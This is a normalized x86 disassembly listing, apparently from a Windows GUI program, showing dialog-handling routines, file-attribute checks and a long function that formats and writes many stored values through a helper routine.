mov [ esp + 0x28 ] 0xf
mov [ esp + 0x24 ] eax
mov [ esp + 0x14 ] al
mov edi [ esp + 0x184 ]
mov ebx [ SendMessageA@IAT ]
push eax
push eax
push 0xe
push edi
mov [ esp + 0x180 ] eax
call ebx
push eax
lea ecx [ esp + 0x14 ]
call sub_401f60
mov eax [ esp + 0x28 ]
mov ebp 0x10
cmp eax ebp
mov eax [ esp + 0x14 ]
jae r-xdata
mov [ rw-data ] 0x2
dec ecx
mov [ rw-data ] ecx
mov edi [ rw-data ]
mov [ rw-data ] edi
mov [ rw-data ] edx
mov [ rw-data ] edx
mov [ rw-data ] edx
jmp r-xdata
lea eax [ esp + 0x68 ]
push eax
push 0x0
push 0xc
push 0x537
push esi
call [ SendDlgItemMessageA@IAT ]
jmp r-xdata
push eax
mov eax [ esp + 0x28 ]
inc eax
push eax
push 0xd
push edi
call ebx
cmp [ esp + 0x28 ] ebp
mov eax [ esp + 0x14 ]
jae r-xdata
lea eax [ esp + 0x14 ]
mov edi [ IsDlgButtonChecked@IAT ]
push 0x539
push esi
call edi
neg eax
sbb eax eax
push 0x53a
neg eax
push esi
mov [ rw-data ] eax
call edi
neg eax
sbb eax eax
push 0x1
neg eax
push esi
mov [ rw-data ] eax
call [ EndDialog@IAT ]
mov eax 0x1
jmp r-xdata
push 0x1
push edx
push eax
call [ InvalidateRect@IAT ]
mov eax [ rw-data ]
cmp eax edx
je r-xdata
push eax
call j_sub_4b692d
add esp 0x4
cmp si 0x535
mov [ esp + 0x4c ] 0x1c
mov [ esp + 0x50 ] 0x4
mov [ esp + 0x60 ] eax
mov [ rw-data ] 0x1
jne r-xdata
lea eax [ esp + 0x14 ]
cmp si 0x537
jne r-xdata
mov edx [ esp + 0x178 ]
push 0x1
lea ecx [ esp + 0x50 ]
push ecx
push 0x2
push 0x536
push edx
jmp r-xdata
lea ecx [ esp + 0x10 ]
mov [ rw-data ] 0x0
call sub_4480e0
jmp r-xdata
mov ecx [ esp + 0x178 ]
push 0x1
lea eax [ esp + 0x50 ]
push eax
push 0x2
push 0x538
push ecx
call [ GetDlgItem@IAT ]
push eax
call [ SetScrollInfo@IAT ]
sub_462cf0
push esi
mov esi ecx
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov [ esi + 0x4 ] 0x0
mov [ esi + 0x8 ] 0x0
mov [ esi + 0xc ] 0x0
pop esi
retn
push eax
call j_sub_4b66ed#2
add esp 0x4
sub_462d20
mov eax [ esp + 0xc ]
push esi
mov esi [ esp + 0xc ]
push edi
mov edi [ esp + 0xc ]
push eax
push ecx
mov ecx [ esp + 0x1c ]
push ecx
push esi
push edi
call sub_461b00
add esp 0x14
lea eax [ edi + esi * 4 ]
pop edi
pop esi
retn 0xc
sub_462d70
push 0xffffffff
push sub_4c0a88
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push esi
push edi
mov edi [ esp + 0x1c ]
mov eax [ edi ]
test eax eax
mov esi ecx
mov [ esp + 0x8 ] esi
je r-xdata
mov [ esi ] eax
lea eax [ edi + 0x8 ]
push eax
lea ecx [ esi + 0x8 ]
mov [ esp + 0x18 ] 0x0
call sub_402400
mov ecx [ edi + 0x78 ]
mov [ esi + 0x78 ] ecx
mov ecx [ esp + 0xc ]
pop edi
mov eax esi
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn 0x4
inc [ eax + 0xd48 ]
sub_462dd0
push ebx
mov ebx [ esp + 0xc ]
push esi
mov esi [ esp + 0x14 ]
cmp ebx esi
je r-xdata
mov eax [ esp + 0xc ]
mov edx [ esp + 0x18 ]
pop esi
mov [ eax ] edx
pop ebx
retn
push edi
mov edi [ esp + 0x1c ]
mov eax [ esi - 0x20 ]
push 0xffffffff
sub esi 0x20
push 0x0
lea ecx [ esi + 0x4 ]
sub edi 0x20
push ecx
lea ecx [ edi + 0x4 ]
mov [ edi ] eax
call sub_401dd0
cmp esi ebx
jne r-xdata
mov eax [ esp + 0x10 ]
mov [ eax ] edi
pop edi
pop esi
pop ebx
retn
sub_462e20
mov edx [ esp + 0x4 ]
push ebp
push esi
mov eax edx
push edi
lea esi [ eax + 0x1 ]
lea esp [ esp ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
mov edi [ esp + 0x14 ]
sub eax esi
push eax
push edx
mov ecx edi
call sub_401e80
mov eax esi
mov eax [ esi ]
jmp r-xdata
pop edi
pop esi
xor eax eax
pop ebp
retn
cmp eax 0x2
jl r-xdata
push eax
call sub_457f40
add esp 0x4
test eax eax
je r-xdata
cmp ebp 0x10
jb r-xdata
cmp ebp 0x10
jb r-xdata
mov ecx esi
mov ecx [ esi ]
jmp r-xdata
mov ecx esi
mov ecx [ esi ]
jmp r-xdata
push esi
call [ GetFileAttributesA@IAT ]
cmp eax 0xffffffff
je r-xdata
mov esi [ esi ]
dec eax
push eax
push ecx
mov ecx edi
call sub_401e80
cmp [ edi + 0x18 ] 0x10
jb r-xdata
inc eax
cmp [ ecx + eax - 0x2 ] 0x3a
jne r-xdata
mov ebp [ edi + 0x18 ]
cmp ebp 0x10
lea esi [ edi + 0x4 ]
jb r-xdata
test al 0x10
je r-xdata
pop edi
pop esi
mov eax 0x1
pop ebp
retn
sub_462ec0
mov edx [ esp + 0x4 ]
push ebx
push esi
mov eax edx
push edi
lea esi [ eax + 0x1 ]
lea esp [ esp ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
mov edi [ esp + 0x14 ]
sub eax esi
push eax
push edx
mov ecx edi
call sub_401e80
mov eax esi
mov eax [ esi ]
jmp r-xdata
pop edi
pop esi
xor eax eax
pop ebx
retn
cmp ebx 0x10
jb r-xdata
push eax
call sub_457f40
add esp 0x4
test eax eax
je r-xdata
mov ecx esi
mov ecx [ esi ]
jmp r-xdata
push esi
call [ GetFileAttributesA@IAT ]
cmp eax 0xffffffff
je r-xdata
mov esi [ esi ]
dec eax
push eax
push ecx
mov ecx edi
call sub_401e80
cmp [ edi + 0x18 ] 0x10
jb r-xdata
mov ebx [ edi + 0x18 ]
cmp ebx 0x10
lea esi [ edi + 0x4 ]
jb r-xdata
pop edi
pop esi
mov eax 0x1
pop ebx
retn
sub_462f40
push 0xffffffff
mov eax [ fs : 0x0 ]
push sub_4c0ab6
push eax
mov eax 0x10234
mov [ fs : 0x0 ] esp
call sub_4b6180
push ebx
push ebp
push esi
push edi
lea ecx [ esp + 0x238 ]
call sub_434e80
push r--data
lea ecx [ esp + 0x23c ]
mov [ esp + 0x10250 ] 0x0
call sub_435490
push r--data
lea ecx [ esp + 0x23c ]
call sub_4354c0
mov eax [ rw-data ]
push eax
push r--data
lea ecx [ esp + 0x240 ]
call sub_4354f0
mov ecx [ rw-data ]
push ecx
push r--data
lea ecx [ esp + 0x240 ]
call sub_4354f0
mov edx [ rw-data ]
push edx
push r--data
lea ecx [ esp + 0x240 ]
call sub_4354f0
mov eax [ rw-data ]
push eax
push r--data
lea ecx [ esp + 0x240 ]
call sub_4354f0
mov ecx [ rw-data ]
push ecx
push r--data
lea ecx [ esp + 0x240 ]
call sub_4354f0
mov eax [ rw-data ]
test eax eax
je r-xdata
mov ecx [ rw-data ]
push ecx
push r--data
lea ecx [ esp + 0x240 ]
call sub_4354f0
mov edx [ rw-data ]
push edx
push r--data
lea ecx [ esp + 0x240 ]
call sub_4354f0
mov eax [ rw-data ]
push eax
push r--data
lea ecx [ esp + 0x240 ]
call sub_4354f0
mov ecx [ rw-data ]
push ecx
push r--data
lea ecx [ esp + 0x240 ]
call sub_4354f0
mov edx [ rw-data ]
push edx
push r--data
lea ecx [ esp + 0x240 ]
call sub_4354f0
mov eax [ rw-data ]
push eax
push r--data
lea ecx [ esp + 0x240 ]
call sub_4354f0
mov ecx [ rw-data ]
push ecx
push r--data
lea ecx [ esp + 0x240 ]
call sub_4354f0
mov edx [ rw-data ]
push edx
push r--data
lea ecx [ esp + 0x240 ]
call sub_4354f0
mov eax [ rw-data ]
push eax
push r--data
lea ecx [ esp + 0x240 ]
call sub_4354f0
mov ecx [ rw-data ]
push ecx
push r--data
lea ecx [ esp + 0x240 ]
call sub_4354f0
mov edx [ rw-data ]
push edx
push r--data
lea ecx [ esp + 0x240 ]
call sub_4354f0
movzx eax [ rw-data ]
push eax
push r--data
lea ecx [ esp + 0x240 ]
call sub_4354f0
mov ecx [ rw-data ]
push ecx
push r--data
lea ecx [ esp + 0x240 ]
call sub_4354f0
mov edx [ rw-data ]
push edx
push r--data
lea ecx [ esp + 0x240 ]
call sub_4354f0
mov eax [ rw-data ]
push eax
push r--data
lea ecx [ esp + 0x240 ]
call sub_4354f0
mov ecx [ rw-data ]
push ecx
push r--data
lea ecx [ esp + 0x240 ]
call sub_4354f0
mov edx [ rw-data ]
push edx
push r--data
lea ecx [ esp + 0x240 ]
call sub_4354f0
mov eax [ rw-data ]
push eax
push r--data
lea ecx [ esp + 0x240 ]
call sub_4354f0
mov ecx [ rw-data ]
push ecx
push r--data
lea ecx [ esp + 0x240 ]
call sub_4354f0
mov edx [ rw-data ]
push edx
push r--data
lea ecx [ esp + 0x240 ]
call sub_4354f0
mov eax [ rw-data ]
push eax
push r--data
lea ecx [ esp + 0x240 ]
call sub_4354f0
mov ecx [ rw-data ]
push ecx
push r--data
lea ecx [ esp + 0x240 ]
call sub_4354f0
mov edx [ rw-data ]
push edx
push r--data
lea ecx [ esp + 0x240 ]
call sub_4354f0
mov eax [ rw-data ]
push eax
push r--data
lea ecx [ esp + 0x240 ]
call sub_4354f0
mov ecx [ rw-data ]
push ecx
push r--data
lea ecx [ esp + 0x240 ]
call sub_4354f0
mov edx [ rw-data ]
push edx
push r--data
lea ecx [ esp + 0x240 ]
call sub_4354f0
mov eax [ rw-data ]
push eax
push r--data
lea ecx [ esp + 0x240 ]
call sub_4354f0
mov ecx [ rw-data ]
push ecx
push r--data
lea ecx [ esp + 0x240 ]
call sub_4354f0
mov edx [ rw-data ]
push edx
push r--data
lea ecx [ esp + 0x240 ]
call sub_4354f0
mov eax [ rw-data ]
push eax
push r--data
lea ecx [ esp + 0x240 ]
call sub_4354f0
mov ecx [ rw-data ]
push ecx
push r--data
lea ecx [ esp + 0x240 ]
call sub_4354f0
mov edx [ rw-data ]
push edx
push r--data
lea ecx [ esp + 0x240 ]
call sub_4354f0
mov eax [ rw-data ]
push eax
push r--data
lea ecx [ esp + 0x240 ]
call sub_4354f0
mov ecx [ rw-data ]
push ecx
push r--data
lea ecx [ esp + 0x240 ]
call sub_4354f0
mov eax [ rw-data ]
mov esi 0x10
cmp eax esi
mov eax [ rw-data ]
jae r-xdata
mov al [ rw-data ]
test al al
je r-xdata
push eax
push r--data
lea ecx [ esp + 0x240 ]
call sub_435580
cmp [ rw-data ] esi
mov eax [ rw-data ]
jae r-xdata
mov eax rw-data
mov eax [ rw-data ]
mov esi [ rw-data ]
mov edi [ rw-data ]
mov ebx [ rw-data ]
mov eax [ rw-data ]
mov esi [ rw-data ]
mov edi [ rw-data ]
mov ebx [ rw-data ]
jmp r-xdata
push eax
push r--data
lea ecx [ esp + 0x240 ]
call sub_435580
mov edx [ rw-data ]
push edx
push r--data
lea ecx [ esp + 0x240 ]
call sub_4354f0
mov eax [ rw-data ]
push eax
push r--data
lea ecx [ esp + 0x240 ]
call sub_4354f0
mov ecx [ rw-data ]
push ecx
push r--data
lea ecx [ esp + 0x240 ]
call sub_4354f0
mov edx [ rw-data ]
push edx
push r--data
lea ecx [ esp + 0x240 ]
call sub_4354f0
mov eax [ rw-data ]
push eax
push r--data
lea ecx [ esp + 0x240 ]
call sub_4354f0
mov ecx [ rw-data ]
push ecx
push r--data
lea ecx [ esp + 0x240 ]
call sub_4354f0
mov edx [ rw-data ]
shr edx 0x14
push edx
push r--data
lea ecx [ esp + 0x240 ]
call sub_4354f0
mov eax [ rw-data ]
push eax
push r--data
lea ecx [ esp + 0x240 ]
call sub_4354f0
mov ecx [ rw-data ]
push ecx
push r--data
lea ecx [ esp + 0x240 ]
call sub_4354f0
mov edx [ rw-data ]
push edx
push r--data
lea ecx [ esp + 0x240 ]
call sub_4354f0
fld [ rw-data ]
fmul [ r--data ]
push ecx
fstp [ esp ]
call sub_452500
add esp 0x4
push eax
push r--data
lea ecx [ esp + 0x240 ]
call sub_4354f0
mov eax [ rw-data ]
push eax
push r--data
lea ecx [ esp + 0x240 ]
call sub_4354f0
mov ecx [ rw-data ]
push ecx
push r--data
lea ecx [ esp + 0x240 ]
call sub_4354f0
mov edx [ rw-data ]
push edx
push r--data
lea ecx [ esp + 0x240 ]
call sub_4354f0
mov eax [ rw-data ]
push eax
push r--data
lea ecx [ esp + 0x240 ]
call sub_4354f0
mov ecx [ rw-data ]
push ecx
push r--data
lea ecx [ esp + 0x240 ]
call sub_4354f0
mov edx [ rw-data ]
push edx
push r--data
lea ecx [ esp + 0x240 ]
call sub_4354f0
mov eax [ rw-data ]
push eax
push r--data
lea ecx [ esp + 0x240 ]
call sub_4354f0
mov ecx [ rw-data ]
push ecx
push r--data
lea ecx [ esp + 0x240 ]
call sub_4354f0
mov edx [ rw-data ]
push edx
push r--data
lea ecx [ esp + 0x240 ]
call sub_4354f0
mov eax [ rw-data ]
push eax
push r--data
lea ecx [ esp + 0x240 ]
call sub_4354f0
mov ecx [ rw-data ]
push ecx
push r--data
lea ecx [ esp + 0x240 ]
call sub_4354f0
mov edx [ rw-data ]
push edx
push r--data
lea ecx [ esp + 0x240 ]
call sub_4354f0
mov eax [ rw-data ]
push eax
push r--data
lea ecx [ esp + 0x240 ]
call sub_4354f0
mov ecx [ rw-data ]
push ecx
push r--data
lea ecx [ esp + 0x240 ]
call sub_4354f0
mov edx [ rw-data ]
push edx
push r--data
lea ecx [ esp + 0x240 ]
call sub_4354f0
mov eax [ rw-data ]
push eax
push r--data
lea ecx [ esp + 0x240 ]
call sub_4354f0
mov ecx [ rw-data ]
push ecx
push r--data
lea ecx [ esp + 0x240 ]
call sub_4354f0
mov edx [ rw-data ]
push edx
push r--data
lea ecx [ esp + 0x240 ]
call sub_4354f0
mov eax [ rw-data ]
push eax
push r--data
lea ecx [ esp + 0x240 ]
call sub_4354f0
mov ecx [ rw-data ]
push ecx
push r--data
lea ecx [ esp + 0x240 ]
call sub_4354f0
mov edx [ rw-data ]
push edx
push r--data
lea ecx [ esp + 0x240 ]
call sub_4354f0
mov eax [ rw-data ]
push eax
push r--data
lea ecx [ esp + 0x240 ]
call sub_4354f0
mov ecx [ rw-data ]
push ecx
push r--data
lea ecx [ esp + 0x240 ]
call sub_4354f0
mov edx [ rw-data ]
push edx
push r--data
lea ecx [ esp + 0x240 ]
call sub_4354f0
mov eax [ rw-data ]
push eax
push r--data
lea ecx [ esp + 0x240 ]
call sub_4354f0
mov ecx [ rw-data ]
push ecx
push r--data
lea ecx [ esp + 0x240 ]
call sub_4354f0
mov edx [ rw-data ]
push edx
push r--data
lea ecx [ esp + 0x240 ]
call sub_4354f0
mov eax [ rw-data ]
push eax
push r--data
lea ecx [ esp + 0x240 ]
call sub_4354f0
mov ecx [ rw-data ]
push ecx
push r--data
lea ecx [ esp + 0x240 ]
call sub_4354f0
mov edx [ rw-data ]
push edx
push r--data
lea ecx [ esp + 0x240 ]
call sub_4354f0
cmp [ rw-data ] esi
mov eax [ rw-data ]
jae r-xdata
mov eax rw-data
push eax
push r--data
lea ecx [ esp + 0x240 ]
call sub_4354f0
push edi
push r--data
lea ecx [ esp + 0x240 ]
call sub_4354f0
push esi
push r--data
lea ecx [ esp + 0x240 ]
call sub_4354f0
push ebx
push r--data
lea ecx [ esp + 0x240 ]
call sub_4354f0
mov edx [ rw-data ]
push edx
push r--data
lea ecx [ esp + 0x240 ]
call sub_4354f0
movzx eax [ rw-data ]
push eax
push r--data
lea ecx [ esp + 0x240 ]
call sub_4354f0
push eax
push r--data
lea ecx [ esp + 0x240 ]
call sub_435580
push rw-data
push r--data
lea ecx [ esp + 0x240 ]
call sub_435580
push rw-data
push r--data
lea ecx [ esp + 0x240 ]
call sub_435580
mov eax [ rw-data ]
push eax
push r--data
lea ecx [ esp + 0x240 ]
call sub_4354f0
mov ecx [ rw-data ]
push ecx
push r--data
lea ecx [ esp + 0x240 ]
call sub_4354f0
mov edx [ rw-data ]
push edx
push r--data
lea ecx [ esp + 0x240 ]
call sub_4354f0
mov eax [ rw-data ]
push eax
push r--data
lea ecx [ esp + 0x240 ]
call sub_4354f0
mov ecx [ rw-data ]
push ecx
push r--data
lea ecx [ esp + 0x240 ]
call sub_4354f0
mov edx [ rw-data ]
push edx
push r--data
lea ecx [ esp + 0x240 ]
call sub_4354f0
mov eax [ rw-data ]
push eax
push r--data
lea ecx [ esp + 0x240 ]
call sub_4354f0
mov ecx [ rw-data ]
push ecx
push r--data
lea ecx [ esp + 0x240 ]
call sub_4354f0
mov edx [ rw-data ]
push edx
push r--data
lea ecx [ esp + 0x240 ]
call sub_4354f0
mov eax [ rw-data ]
push eax
push r--data
lea ecx [ esp + 0x240 ]
call sub_4354f0
mov ecx [ rw-data ]
push ecx
push r--data
lea ecx [ esp + 0x240 ]
call sub_4354f0
movzx edx [ rw-data ]
push edx
push r--data
lea ecx [ esp + 0x240 ]
call sub_4354f0
mov eax [ rw-data ]
push eax
push r--data
lea ecx [ esp + 0x240 ]
call sub_4354f0
mov ecx [ rw-data ]
push ecx
push r--data
lea ecx [ esp + 0x240 ]
call sub_4354f0
mov edx [ rw-data ]
push edx
push r--data
lea ecx [ esp + 0x240 ]
call sub_4354f0
movzx eax [ rw-data ]
push eax
push r--data
lea ecx [ esp + 0x240 ]
call sub_4354f0
mov ecx [ rw-data ]
push ecx
push r--data
lea ecx [ esp + 0x240 ]
call sub_4354f0
mov edx [ rw-data ]
push edx
push r--data
lea ecx [ esp + 0x240 ]
call sub_4354f0
push r--data
lea ecx [ esp + 0x23c ]
call sub_4354c0
mov eax [ rw-data ]
push eax
push r--data
lea ecx [ esp + 0x240 ]
call sub_4354f0
mov ecx [ rw-data ]
push ecx
push r--data
lea ecx [ esp + 0x240 ]
call sub_4354f0
mov edx [ rw-data ]
push edx
push r--data
lea ecx [ esp + 0x240 ]
call sub_4354f0
mov eax [ rw-data ]
push eax
push r--data
lea ecx [ esp + 0x240 ]
call sub_4354f0
mov ecx [ rw-data ]
push ecx
push r--data
lea ecx [ esp + 0x240 ]
call sub_4354f0
push r--data
lea ecx [ esp + 0x23c ]
call sub_4354c0
mov edx [ rw-data ]
push edx
push r--data
lea ecx [ esp + 0x240 ]
call sub_4354f0
push rw-data
push r--data
lea ecx [ esp + 0x240 ]
call sub_435580
push r--data
lea ecx [ esp + 0x23c ]
call sub_4354c0
mov eax [ rw-data ]
push eax
push r--data
lea ecx [ esp + 0x240 ]
call sub_4354f0
mov ecx [ rw-data ]
push ecx
push r--data
lea ecx [ esp + 0x240 ]
call sub_4354f0
mov edx [ rw-data ]
push edx
push r--data
lea ecx [ esp + 0x240 ]
call sub_4354f0
mov eax [ rw-data ]
push eax
push r--data
lea ecx [ esp + 0x240 ]
call sub_4354f0
mov ecx [ rw-data ]
push ecx
push r--data
lea ecx [ esp + 0x240 ]
call sub_4354f0
mov edx [ rw-data ]
push edx
push r--data
lea ecx [ esp + 0x240 ]
call sub_4354f0
mov eax [ rw-data ]
push eax
push r--data
lea ecx [ esp + 0x240 ]
call sub_4354f0
mov ecx [ rw-data ]
push ecx
push r--data
lea ecx [ esp + 0x240 ]
call sub_4354f0
mov edx [ rw-data ]
push edx
push r--data
lea ecx [ esp + 0x240 ]
call sub_4354f0
mov eax [ rw-data ]
push eax
push r--data
lea ecx [ esp + 0x240 ]
call sub_4354f0
mov ecx [ rw-data ]
push ecx
push r--data
lea ecx [ esp + 0x240 ]
call sub_4354f0
mov edx [ rw-data ]
push edx
push r--data
lea ecx [ esp + 0x240 ]
call sub_4354f0
mov eax [ rw-data ]
push eax
push r--data
lea ecx [ esp + 0x240 ]
call sub_4354f0
mov ecx [ rw-data ]
push ecx
push r--data
lea ecx [ esp + 0x240 ]
call sub_4354f0
mov edx [ rw-data ]
push edx
push r--data
lea ecx [ esp + 0x240 ]
call sub_4354f0
push 0x3c
push rw-data
push r--data
lea ecx [ esp + 0x244 ]
call sub_435660
push r--data
lea ecx [ esp + 0x23c ]
call sub_4354c0
mov eax [ rw-data ]
push eax
push r--data
lea ecx [ esp + 0x240 ]
call sub_4354f0
mov ecx [ rw-data ]
push ecx
push r--data
lea ecx [ esp + 0x240 ]
call sub_4354f0
mov edx [ rw-data ]
push edx
push r--data
lea ecx [ esp + 0x240 ]
call sub_4354f0
mov ebx [ wsprintfA@IAT ]
mov [ esp + 0x14 ] r--data
mov [ esp + 0x18 ] r--data
mov [ esp + 0x1c ] r--data
mov [ esp + 0x20 ] r--data
xor edi edi
mov eax rw-data
mov eax [ rw-data ]
sub eax ecx
sar eax 0x4
xor eax eax
jmp r-xdata
xor edi edi
mov esi rw-data
xor esi esi
lea ebp [ edi + 0x1 ]
shl edi 0x4
lea esp [ esp ]
cmp edi eax
jge r-xdata
inc edi
push edi
lea edx [ esp + 0x3c ]
push r--data
push edx
call ebx
add esp 0xc
lea eax [ esp + 0x38 ]
push eax
lea ecx [ esp + 0x23c ]
call sub_4354c0
mov ecx [ esi - 0x4 ]
push ecx
push r--data
lea ecx [ esp + 0x240 ]
call sub_4354f0
mov edx [ esi ]
push edx
push r--data
lea ecx [ esp + 0x240 ]
call sub_4354f0
mov eax [ esi - 0x8 ]
push eax
push r--data
lea ecx [ esp + 0x240 ]
call sub_4354f0
mov ecx [ esi - 0x1c ]
push ecx
push r--data
lea ecx [ esp + 0x240 ]
call sub_4354f0
mov edx [ esi - 0x18 ]
push edx
push r--data
lea ecx [ esp + 0x240 ]
call sub_4354f0
mov eax [ esi - 0x14 ]
push eax
push r--data
lea ecx [ esp + 0x240 ]
call sub_4354f0
mov ecx [ esi - 0xc ]
push ecx
push r--data
lea ecx [ esp + 0x240 ]
call sub_4354f0
mov edx [ esi - 0x10 ]
push edx
push r--data
lea ecx [ esp + 0x240 ]
call sub_4354f0
mov eax [ esi + 0x4 ]
push eax
push r--data
lea ecx [ esp + 0x240 ]
call sub_4354f0
mov ecx [ esi + 0x8 ]
push ecx
push r--data
lea ecx [ esp + 0x240 ]
call sub_4354f0
lea edx [ esi + 0xc ]
push edx
push r--data
lea ecx [ esp + 0x240 ]
call sub_435580
add esi 0x12c
cmp esi rw-data
jl r-xdata
push r--data
lea ecx [ esp + 0x23c ]
call sub_4354c0
mov eax [ rw-data ]
push eax
push r--data
lea ecx [ esp + 0x240 ]
call sub_4354f0
mov ecx [ rw-data ]
push ecx
push r--data
lea ecx [ esp + 0x240 ]
call sub_4354f0
mov edx [ rw-data ]
push edx
push r--data
lea ecx [ esp + 0x240 ]
call sub_4354f0
mov eax [ rw-data ]
push eax
push r--data
lea ecx [ esp + 0x240 ]
call sub_4354f0
mov ecx [ rw-data ]
push ecx
push r--data
lea ecx [ esp + 0x240 ]
call sub_4354f0
push r--data
lea ecx [ esp + 0x23c ]
call sub_4354c0
mov edx [ rw-data ]
push edx
push r--data
lea ecx [ esp + 0x240 ]
call sub_4354f0
mov eax [ rw-data ]
push eax
push r--data
lea ecx [ esp + 0x240 ]
call sub_4354f0
push rw-data
push r--data
lea ecx [ esp + 0x240 ]
call sub_435580
mov ecx [ rw-data ]
push ecx
push r--data
lea ecx [ esp + 0x240 ]
call sub_4354f0
push r--data
lea ecx [ esp + 0x23c ]
call sub_4354c0
mov edx [ rw-data ]
push edx
push r--data
lea ecx [ esp + 0x240 ]
call sub_4354f0
mov eax [ rw-data ]
push eax
push r--data
lea ecx [ esp + 0x240 ]
call sub_4354f0
push rw-data
push r--data
lea ecx [ esp + 0x240 ]
call sub_435580
mov ecx [ rw-data ]
push ecx
push r--data
lea ecx [ esp + 0x240 ]
call sub_4354f0
push r--data
lea ecx [ esp + 0x23c ]
call sub_4354c0
mov al [ rw-data ]
test al al
mov al [ rw-data ]
jne r-xdata
mov eax [ esp + esi * 4 + 0x14 ]
push ebp
push eax
lea ecx [ esp + 0x40 ]
push r--data
push ecx
call ebx
mov edx [ rw-data ]
mov eax [ edx + edi ]
add esp 0x10
push eax
lea ecx [ esp + 0x3c ]
push ecx
lea ecx [ esp + 0x240 ]
call sub_4354f0
inc esi
add edi 0x4
cmp esi 0x4
jl r-xdata
mov edi ebp
jmp r-xdata
movzx edx al
push edx
push r--data
lea ecx [ esp + 0x240 ]
call sub_4354f0
mov eax [ rw-data ]
push eax
push r--data
lea ecx [ esp + 0x240 ]
call sub_4354f0
mov ecx [ rw-data ]
push ecx
push r--data
lea ecx [ esp + 0x240 ]
call sub_4354f0
mov edx [ rw-data ]
push edx
push r--data
lea ecx [ esp + 0x240 ]
call sub_4354f0
push rw-data
push r--data
lea ecx [ esp + 0x240 ]
call sub_435580
mov eax [ rw-data ]
test eax eax
je r-xdata
mov al [ rw-data ]
mov ecx [ rw-data ]
test ecx ecx
jne r-xdata
push r--data
lea ecx [ esp + 0x23c ]
call sub_4354c0
mov al [ rw-data ]
test al al
mov eax [ rw-data ]
jne r-xdata
mov esi [ SendMessageA@IAT ]
push 0x0
push 0x0
push 0x101d
push eax
call esi
push eax
push r--data
lea ecx [ esp + 0x240 ]
call sub_4354f0
mov eax [ rw-data ]
push 0x0
push 0x1
push 0x101d
push eax
call esi
push eax
push r--data
lea ecx [ esp + 0x240 ]
call sub_4354f0
mov ecx [ rw-data ]
push 0x0
push 0x2
push 0x101d
push ecx
call esi
push eax
push r--data
lea ecx [ esp + 0x240 ]
call sub_4354f0
mov edx [ rw-data ]
push 0x0
push 0x3
push 0x101d
push edx
call esi
push eax
push r--data
lea ecx [ esp + 0x240 ]
call sub_4354f0
push eax
push r--data
lea ecx [ esp + 0x240 ]
call sub_4354f0
mov eax [ rw-data ]
push eax
push r--data
lea ecx [ esp + 0x240 ]
call sub_4354f0
mov ecx [ rw-data ]
push ecx
push r--data
lea ecx [ esp + 0x240 ]
call sub_4354f0
mov edx [ rw-data ]
push edx
push r--data
lea ecx [ esp + 0x240 ]
call sub_4354f0
mov eax [ rw-data ]
push eax
push r--data
lea ecx [ esp + 0x240 ]
call sub_4354f0
mov ecx [ rw-data ]
push ecx
push r--data
lea ecx [ esp + 0x240 ]
call sub_4354f0
mov edx [ rw-data ]
push edx
push r--data
lea ecx [ esp + 0x240 ]
call sub_4354f0
xor edi edi
mov [ esp + 0x14 ] r--data
mov [ esp + 0x18 ] r--data
mov [ esp + 0x1c ] r--data
mov [ esp + 0x20 ] r--data
mov [ esp + 0x10 ] edi
lea ecx [ ecx ]
mov eax [ rw-data ]
mov eax [ esp + 0x10 ]
add eax 0x4
add edi 0x10
cmp eax 0x10
mov [ esp + 0x10 ] eax
jl r-xdata
mov ecx [ edi + rw-data ]
sub ecx eax
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add edx eax
mov [ esp + 0x34 ] edx
je r-xdata
mov eax [ edi + rw-data ]
test eax eax
je r-xdata
push r--data
lea ecx [ esp + 0x23c ]
call sub_4354c0
mov edx [ rw-data ]
push edx
push r--data
lea ecx [ esp + 0x240 ]
call sub_4354f0
mov eax [ rw-data ]
push eax
push r--data
lea ecx [ esp + 0x240 ]
call sub_4354f0
mov ecx [ rw-data ]
push ecx
push r--data
lea ecx [ esp + 0x240 ]
call sub_4354f0
mov edx [ rw-data ]
push edx
push r--data
lea ecx [ esp + 0x240 ]
call sub_4354f0
mov eax [ rw-data ]
mov ecx [ rw-data ]
add ecx eax
xor esi esi
test ecx ecx
jle r-xdata
mov esi [ esp + 0x10 ]
mov eax [ esp + esi + 0x14 ]
push eax
lea ecx [ esp + 0x3c ]
push r--data
push ecx
mov [ esp + 0x40 ] eax
call ebx
mov edx [ esi + rw-data ]
add esp 0xc
push edx
lea eax [ esp + 0x3c ]
push eax
lea ecx [ esp + 0x240 ]
call sub_4354f0
xor esi esi
xor ebp ebp
jmp r-xdata
mov ecx [ rw-data ]
mov esi [ rw-data ]
mov edx [ rw-data ]
mov eax [ rw-data ]
or ecx esi
or ecx edx
or ecx eax
je r-xdata
mov ebp 0x6e
mov eax [ edi + rw-data ]
test eax eax
jne r-xdata
push r--data
lea ecx [ esp + 0x23c ]
call sub_4354c0
mov al [ rw-data ]
test al al
mov eax [ rw-data ]
jne r-xdata
push r--data
lea ecx [ esp + 0x23c ]
call sub_4354c0
movzx edx [ rw-data ]
push edx
push r--data
lea ecx [ esp + 0x240 ]
call sub_4354f0
mov eax [ rw-data ]
push eax
push r--data
lea ecx [ esp + 0x240 ]
call sub_4354f0
mov ecx [ rw-data ]
push ecx
push r--data
lea ecx [ esp + 0x240 ]
call sub_4354f0
mov edx [ rw-data ]
push edx
push r--data
lea ecx [ esp + 0x240 ]
call sub_4354f0
mov eax [ rw-data ]
push eax
push r--data
lea ecx [ esp + 0x240 ]
call sub_4354f0
cmp [ esi * 4 + rw-data ] 0x70
jne r-xdata
mov [ esi * 4 + rw-data ] 0x6d
mov ecx [ edi + rw-data ]
sub ecx eax
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov ecx edx
shr ecx 0x1f
add edx ecx
xor edx edx
jmp r-xdata
push eax
push r--data
lea ecx [ esp + 0x240 ]
call sub_4354f0
mov ecx [ rw-data ]
add ecx 0xfffffffe
push ecx
push r--data
lea ecx [ esp + 0x240 ]
call sub_4354f0
mov edx [ rw-data ]
push edx
push r--data
lea ecx [ esp + 0x240 ]
call sub_4354f0
mov eax [ rw-data ]
push eax
push r--data
lea ecx [ esp + 0x240 ]
call sub_4354f0
mov ecx [ rw-data ]
push ecx
push r--data
lea ecx [ esp + 0x240 ]
call sub_4354f0
mov edx [ rw-data ]
push edx
